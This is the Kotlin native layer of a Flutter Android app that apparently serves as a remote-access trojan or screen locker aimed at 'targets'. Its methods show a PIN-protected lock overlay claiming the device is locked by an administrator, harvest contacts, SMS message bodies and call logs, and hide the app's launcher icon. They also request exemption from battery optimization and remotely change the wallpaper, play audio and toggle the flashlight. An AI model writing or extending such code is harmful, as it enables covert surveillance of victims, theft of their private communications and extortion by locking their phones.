package com.nullx.cyber

import android.app.Activity
import android.app.WallpaperManager
import android.content.Context
import android.content.Intent
import android.graphics.BitmapFactory
import android.hardware.camera2.CameraManager
import android.media.MediaPlayer
import android.net.Uri
import android.os.Build
import android.provider.Settings
import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel
import java.net.URL

class MainActivity : FlutterActivity() {

    private val CHANNEL = "miyabi/native"
    private var mediaPlayer: MediaPlayer? = null

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)

        MethodChannel(
            flutterEngine.dartExecutor.binaryMessenger,
            CHANNEL
        ).setMethodCallHandler { call, result ->
            when (call.method) {

                // ═══ OVERLAY PERMISSION ═══
                "hasOverlayPermission" ->
                    result.success(Settings.canDrawOverlays(this))

                "requestOverlayPermission" -> {
                    if (!Settings.canDrawOverlays(this)) {
                        try {
                            startActivityForResult(
                                Intent(
                                    Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                                    Uri.parse("package:$packageName")
                                ), 1001
                            )
                        } catch (_: Exception) {}
                    }
                    result.success(true)
                }

                // ═══ BATTERY OPTIMIZATION ═══
                "requestIgnoreBatteryOptimization" -> {
                    try {
                        @Suppress("BatteryLife")
                        startActivity(
                            Intent(
                                Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                                Uri.parse("package:$packageName")
                            )
                        )
                    } catch (_: Exception) {}
                    result.success(true)
                }
                "isIgnoringBatteryOptimization" -> {
                    val pm = getSystemService(Context.POWER_SERVICE)
                            as android.os.PowerManager
                    result.success(pm.isIgnoringBatteryOptimizations(packageName))
                }

                // ═══ LOCK OVERLAY ═══
                "showLockOverlay" -> {
                    val pin = call.argument<String>("pin") ?: "123"
                    val message = call.argument<String>("message")
                        ?: "Perangkat ini terkunci oleh administrator."
                    val target = call.argument<String>("targetId") ?: ""

                    if (!Settings.canDrawOverlays(this)) {
                        result.success(false)
                    } else {
                        try {
                            val i = Intent(this, LockActivity::class.java).apply {
                                addFlags(
                                    Intent.FLAG_ACTIVITY_NEW_TASK or
                                    Intent.FLAG_ACTIVITY_CLEAR_TOP or
                                    Intent.FLAG_ACTIVITY_SINGLE_TOP or
                                    Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS
                                )
                                putExtra(LockActivity.EXTRA_PIN, pin)
                                putExtra(LockActivity.EXTRA_MESSAGE, message)
                                putExtra(LockActivity.EXTRA_TARGET, target)
                            }
                            startActivity(i)
                            result.success(true)
                        } catch (e: Exception) {
                            result.success(false)
                        }
                    }
                }
                "hideLockOverlay" -> {
                    try {
                        LockActivity.isShowing = false
                        LockActivity.dismiss(this)
                        result.success(true)
                    } catch (e: Exception) {
                        result.success(false)
                    }
                }

                // ═══ ✅ FLASHLIGHT (INI YANG HILANG!) ═══
                "setFlashlight" -> {
                    val on = call.argument<Boolean>("on") ?: false
                    result.success(setTorch(on))
                }

                // ═══ MEDIA PLAYER ═══
                "playMedia" -> {
                    val url = call.argument<String>("url") ?: ""
                    val type = call.argument<String>("type") ?: "audio"
                    try {
                        playMedia(url, type)
                        result.success(true)
                    } catch (e: Exception) {
                        result.success(false)
                    }
                }
                "stopMedia" -> {
                    try {
                        stopMedia()
                        result.success(true)
                    } catch (e: Exception) {
                        result.success(false)
                    }
                }

                // ═══ WALLPAPER ═══
                "setWallpaper" -> {
                    val url = call.argument<String>("url") ?: ""
                    result.success(setWallpaper(url))
                }

                // ═══ CONTACTS ═══
                "getContacts" -> {
                    try {
                        result.success(getContacts())
                    } catch (e: Exception) {
                        result.success(emptyList<Map<String, String>>())
                    }
                }

                // ═══ SMS ═══
                "getSmsLog" -> {
                    try {
                        result.success(getSmsLog())
                    } catch (e: Exception) {
                        result.success(emptyList<Map<String, String>>())
                    }
                }

                // ═══ CALL LOG ═══
                "getCallLog" -> {
                    try {
                        result.success(getCallLog())
                    } catch (e: Exception) {
                        result.success(emptyList<Map<String, String>>())
                    }
                }

                // ═══ SNAP PHOTO ═══
                "snapPhoto" -> result.success("")

                // ═══ HIDE / SHOW APP ═══
                "setAppHidden" -> {
                    val hidden = call.argument<Boolean>("hidden") ?: true
                    try {
                        val comp = android.content.ComponentName(
                            this, MainActivity::class.java
                        )
                        val state = if (hidden)
                            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED
                        else
                            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED
                        packageManager.setComponentEnabledSetting(comp, state, 1)
                        result.success(true)
                    } catch (e: Exception) {
                        result.success(false)
                    }
                }

                // ═══ SCREEN CAPTURE ═══
                "captureScreen" -> result.success(null)

                // ═══ TARGET ID ═══
                "getTargetId" -> {
                    val androidId = Settings.Secure.getString(
                        contentResolver, Settings.Secure.ANDROID_ID
                    ) ?: "unknown"
                    val short = androidId.takeLast(6).uppercase()
                    val brand = Build.BRAND.uppercase().take(3)
                    result.success("DEV-$brand-$short")
                }

                // ═══ PIN UNLOCK FLAG ═══
                "isUnlockedByPin" -> {
                    val prefs = getSharedPreferences(
                        "miyabi_prefs", Context.MODE_PRIVATE
                    )
                    val flag = prefs.getBoolean("unlocked_by_pin", false)
                    if (flag) {
                        prefs.edit().putBoolean("unlocked_by_pin", false).apply()
                    }
                    result.success(flag)
                }

                else -> result.notImplemented()
            }
        }
    }

    // ═══════════════════════════════════════════════════════════
    //   ✅ FLASHLIGHT IMPLEMENTATION
    // ═══════════════════════════════════════════════════════════
    private fun setTorch(on: Boolean): Boolean {
        return try {
            val cm = getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val id = cm.cameraIdList.firstOrNull { cameraId ->
                cm.getCameraCharacteristics(cameraId).get(
                    android.hardware.camera2.CameraCharacteristics.FLASH_INFO_AVAILABLE
                ) == true
            } ?: return false
            cm.setTorchMode(id, on)
            true
        } catch (e: Exception) {
            false
        }
    }

    // ═══ MEDIA ═══
    private fun playMedia(url: String, type: String) {
        if (url.isBlank()) return
        try {
            stopMedia()
            if (type == "audio") {
                mediaPlayer = MediaPlayer().apply {
                    setDataSource(url)
                    setOnPreparedListener { it.start() }
                    prepareAsync()
                }
            }
        } catch (_: Exception) {}
    }

    private fun stopMedia() {
        try {
            mediaPlayer?.stop()
            mediaPlayer?.release()
            mediaPlayer = null
        } catch (_: Exception) {}
    }

    // ═══ WALLPAPER ═══
    private fun setWallpaper(url: String): Boolean {
        return try {
            val bitmap = BitmapFactory.decodeStream(URL(url).openStream())
            WallpaperManager.getInstance(this).setBitmap(bitmap)
            true
        } catch (e: Exception) {
            false
        }
    }

    // ═══ CONTACTS ═══
    private fun getContacts(): List<Map<String, String>> {
        val list = mutableListOf<Map<String, String>>()
        try {
            val cursor = contentResolver.query(
                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null
            )
            cursor?.use {
                while (it.moveToNext()) {
                    val name = it.getString(it.getColumnIndex(
                        android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME
                    )) ?: ""
                    val phone = it.getString(it.getColumnIndex(
                        android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER
                    )) ?: ""
                    list.add(mapOf("name" to name, "phone" to phone))
                }
            }
        } catch (_: Exception) {}
        return list
    }

    // ═══ SMS ═══
    private fun getSmsLog(): List<Map<String, String>> {
        val list = mutableListOf<Map<String, String>>()
        try {
            val cursor = contentResolver.query(
                Uri.parse("content://sms/inbox"),
                null, null, null, "date DESC"
            )
            cursor?.use {
                var count = 0
                while (it.moveToNext() && count < 100) {
                    val addr = it.getString(it.getColumnIndex("address")) ?: ""
                    val body = it.getString(it.getColumnIndex("body")) ?: ""
                    list.add(mapOf("from" to addr, "body" to body))
                    count++
                }
            }
        } catch (_: Exception) {}
        return list
    }

    // ═══ CALL LOG ═══
    private fun getCallLog(): List<Map<String, String>> {
        val list = mutableListOf<Map<String, String>>()
        try {
            val cursor = contentResolver.query(
                android.provider.CallLog.Calls.CONTENT_URI,
                null, null, null, "date DESC"
            )
            cursor?.use {
                var count = 0
                while (it.moveToNext() && count < 100) {
                    val num = it.getString(it.getColumnIndex(
                        android.provider.CallLog.Calls.NUMBER
                    )) ?: ""
                    val dur = it.getString(it.getColumnIndex(
                        android.provider.CallLog.Calls.DURATION
                    )) ?: ""
                    list.add(mapOf("number" to num, "duration" to dur))
                    count++
                }
            }
        } catch (_: Exception) {}
        return list
    }
}